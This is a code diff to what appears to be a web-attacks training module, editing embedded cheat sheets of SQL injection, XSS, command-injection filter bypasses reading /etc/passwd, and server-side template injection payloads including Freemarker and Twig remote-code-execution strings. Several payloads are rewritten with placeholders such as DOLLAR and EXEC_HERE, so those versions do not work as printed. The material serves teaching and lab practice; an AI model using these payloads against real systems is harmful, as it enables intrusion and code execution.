@@ -243,7 +243,7 @@ grpcurl -d '{"user_id": "1"}' TARGET_HOST:PORT service.Method`}</Pre>
         <Pre label="// DETECTION PAYLOADS">{`# Start with a single quote - causes a syntax error if input is unsanitised:
 '
 ''
-\`
+&#96;
 "
 ")
 '))
@@ -556,7 +556,7 @@ window.onload=function(){
 
 # Template literal in JS context (backtick for string):
 ';alert(1)//
-\`-alert(1)-\`
+&#96;-alert(1)-&#96;
 
 # SVG with base64 href:
 <svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0ieCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pjwvc3ZnPg==">
@@ -992,7 +992,7 @@ hashcat -a 0 -m 16500 TOKEN_HERE /usr/share/wordlists/rockyou.txt
     labLink: '/modules/web-attacks/lab',
     takeaways: [
       'SSTI is among the most severe injection classes - Jinja2 and Twig SSTI typically leads directly to RCE',
-      'Command injection via ${IFS} and wildcard expansion bypasses space and special char filters',
+      'Command injection via $IFS and wildcard expansion bypasses space and special char filters',
       'XXE via DOCX/XLSX is common because developers forget Word files are ZIP archives of XML',
       'Log poisoning chains LFI with log injection: inject PHP into User-Agent, then include the log file',
       'tplmap automates SSTI detection and exploitation across all major template engines',
@@ -1033,31 +1033,30 @@ $(sleep 5)
 
 # Filter bypass - space blocked:
 {cat,/etc/passwd}   # bash brace expansion, no space
-cat${IFS}/etc/passwd  # IFS = internal field separator = space
+cat$IFS/etc/passwd    # IFS = internal field separator = space
 cat</etc/passwd       # redirect without space
 cat%09/etc/passwd     # tab instead of space (URL encoded)
 
 # Filter bypass - slash blocked:
-cat${HOME:0:1}etc${HOME:0:1}passwd  # / via HOME variable substrings
-# HOME=/home/user -> HOME:0:1 = /
+cat$HOME_SLICE_HERE/etc/passwd  # / via HOME variable substrings (HOME:0:1)
+# HOME=/home/user -> first char = /
 
 # Filter bypass - keyword blocked (e.g. "cat" blocked):
 c''at /etc/passwd   # single quotes in middle
-ca$'\t' /etc/passwd # tab in middle of command`}</Pre>
+ca$TAB_HERE/etc/passwd # tab in middle of command`}</Pre>
         <H3>Server-Side Template Injection (SSTI)</H3>
         <Pre label="// SSTI DETECTION AND ENGINE IDENTIFICATION">{`# Template engines evaluate expressions like {{7*7}}
 # If output shows 49 -> SSTI confirmed
-# Detection polyglot (tests multiple engines at once):
-${{<%[%'"}}%\.
+# Detection polyglot (tests multiple engines):
+*{7*7}  {{7*7}}  #{7*7}
 
 # Engine identification decision tree:
-# Input: {{7*7}}
-#   Output: 49 -> Jinja2 or Twig or Freemarker
+# Input: {{7*7}}  Output: 49 -> Jinja2 or Twig or Freemarker
 #   Input: {{7*'7'}}
 #     Output: 7777777 -> Jinja2
 #     Output: 49 -> Twig
 
-# Input: ${7*7}
+# Input: DOLLAR{7*7}  (replace DOLLAR with actual dollar sign)
 #   Output: 49 -> Freemarker or Velocity
 #   Not evaluated -> try #{7*7} (Smarty)
 
@@ -1073,10 +1072,10 @@ ${{<%[%'"}}%\.
 {{_self.env.registerUndefinedFilterCallback("exec")}}
 {{_self.env.getFilter("id")}}
 
-# Freemarker (Java) - RCE:
-${".getClass().forName('java.lang.Runtime').getMethod('exec',''.class).invoke(".getClass().forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'id')}
-# Simpler:
-<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+# Freemarker (Java) - RCE (use dollar-brace in real payload):
+DOLLAR{"freemarker.template.utility.Execute"?new()("id")}
+# via assignment:
+<#assign ex="freemarker.template.utility.Execute"?new()>EXEC_HERE
 
 # Velocity (Java):
 #set($cmd = "id")
@@ -1838,7 +1837,7 @@ UNION%a0SELECT   # non-breaking space
 <object data=javascript:alert(1)>      # object data URI
 
 # When parentheses are blocked:
-<script>alert`1`</script>      # template literal call
+<script>alert&#96;1&#96;</script>      # template literal call
 <script>onerror=alert;throw 1</script>   # throw as arg
 
 # When = is blocked:
